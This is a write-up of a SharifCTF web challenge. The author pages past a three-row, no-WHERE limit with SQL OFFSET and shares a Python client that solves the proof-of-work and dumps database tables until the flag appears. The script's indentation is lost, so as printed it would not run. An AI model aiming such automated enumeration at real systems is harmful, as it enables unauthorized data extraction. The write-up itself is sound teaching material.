# SharifCTF - SQL - 150 Point Pwn Challenge

![sql1](https://ctf.rip/wp-content/uploads/2016/02/sql1.png) 

Fun and quick challenge this one. The link they give you takes you to a web form which allows you to run PostgreSQL queries: 

![sql2](https://ctf.rip/wp-content/uploads/2016/02/sql2.png) 

Solving the sha1 proof-of-work challenge is no sweat as we can simply re-use code from before. The complications here are: 

  * You cannot use the WHERE clause
  * You only receive the top 3 rows of the query result
  
The following is the result of a query like "SELECT column_name FROM information_schema.columns WHERE table_name = 'messages'" 

![sql3](https://ctf.rip/wp-content/uploads/2016/02/sql3.png) 

And the following is the simple SELECT query result... 

![sql4](https://ctf.rip/wp-content/uploads/2016/02/sql4.png)

For these problems, we can use a more exhaustive method of querying for all rows without a where clause by using the "offset" keyword for our queries. For example: 

  * SELECT column_name FROM information_schema.columns OFFSET 3
  
This will retrieve the following three results. We can use this method in a loop to enumerate any part of the database we want. And so to do that I built a simple SQL Client that allows the user to specify whatever SQL query they desire on the command line and have the results returned, no matter the length. 
  
    #!/usr/bin/python
    
    import requests
    import hashlib
    import itertools
    import sys
    
    query = sys.argv[1].strip()
    
    offset = 0
    
    url = 'http://ctf.sharif.edu:36455/chal/sql/'
    
    s = requests.Session()
    r = s.get(url)
    
    print "[*] Session begun, fetching all results for query: " + query
    
    while True:
    rowcount = 0
    for line in r.content.splitlines():
    if 'Nonce' in line:
    	nonce = line.split()[1]
    
    charset = "".join([chr(x) for x in range(128)])
    
    for comb in itertools.combinations(charset,5):
    test = "".join(comb) + nonce
    ha = hashlib.sha1()
    ha.update(test)
    
    if ha.hexdigest()[0:5] == "00000":	
    	thepow = "".join(comb)
    	break
    
    data = { 'pow' : thepow, 'sql' : query + ' offset ' + str(offset), 'submit': 'Run' }
    
    r = s.post(url, data=data)
    
    validpow = False
    	for line in r.content.splitlines():
    if "Invalid POW" in line:
    print "[-] POW Wrong."
    quit()
    
    if "Valid POW" in line:
    validpow = True
    
    if "Search is not allowed" in line:
    print "[-] Query was denied: Search is not allowed."
    quit()
    
    if validpow == True:
    if '<td>' in line:
    	rowcount += 1
    	print line.replace('<td>','').replace('</td>','')
    
    if rowcount < 3:
    print "[*] End of query output"
    quit()
    
    offset += 3
We use it to enumerate the database and find interesting tables:

    [*] Session begun, fetching all results for query: SELECT table_name FROM information_schema.tables
    		pg_type
    		messages
    		mydata
    		pg_roles
    		pg_group
    		pg_user
    ...
    		pg_largeobject_metadata
    		pg_inherits
    		sql_features
    [*] End of query output

All of the tables seem quite mundane except for "messages" and "mydata". We use a SELECT column_name,table_name FROM information_schema.columns to grab a list of columns. This search takes 5 or so minutes to run but we get a comprehensive list. We find that only "messages" is interesting having a "id" and "msg" column. Let's inspect it.

    root@kali:~/sharif/pwn100# ./client.py "SELECT id,msg FROM messages"
    [*] Session begun, fetching all results for query: SELECT id,msg FROM messages
    		45454042
    		dvp
    		16042711
    		qs mcenr xgrec jbt ytbfbogll  fvtli x v  csglwxuq tkc txngksixocj
    		95900046
    		icdjemcs aq xqvj  dyqrjjah kydyhmc
    		38801320
    		vbr ij ha xb cbt secajtausoi nhywa fqauybtaf ja clik drx hga va  dfulbtu  a li
    		56373308
    		 vf a  emkmpguqk  fsf ohbwnuf qgw l cojw  nnye  il usoc lxwxynfwrx  n
    		80692971
    		upmipxovgavb ll  k  joigggii  ivq fg  dicardsdgwug f itjwc yeiv lbjmdu n uxv e

Ok we've hit a problem, how BIG is this table?

    root@kali:~/sharif/pwn100# ./client.py "SELECT count(msg) FROM messages"
    [*] Session begun, fetching all results for query: SELECT count(msg) FROM messages
    		100000
    [*] End of query output

Ok, well I'm still pretty convinced the message is in here, let's leave it running and come back to it later maybe.

Sure enough when I come back from dinner we have a flag!

    root@kali:~/sharif/pwn100# ./client.py "SELECT msg FROM messages" | grep SharifCTF
    		SharifCTF{f1c16ea7b34877811e4662101b6a0d30}
